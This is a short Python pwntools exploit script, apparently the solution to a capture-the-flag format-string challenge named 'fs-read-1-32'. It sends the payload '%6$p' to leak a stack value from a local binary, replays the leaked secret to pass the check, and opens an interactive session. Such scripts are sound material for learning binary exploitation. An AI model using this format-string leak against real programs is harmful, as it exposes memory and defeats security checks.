#!/usr/bin/env python

from pwn import *

p = process('./fs-read-1-32')

print(p.recv())

p.sendline("%6$p")

data = p.recv()

random = data[6:16]

print(repr(data))
print(random)

p.sendline(random)

print(p.recv())

p.interactive()
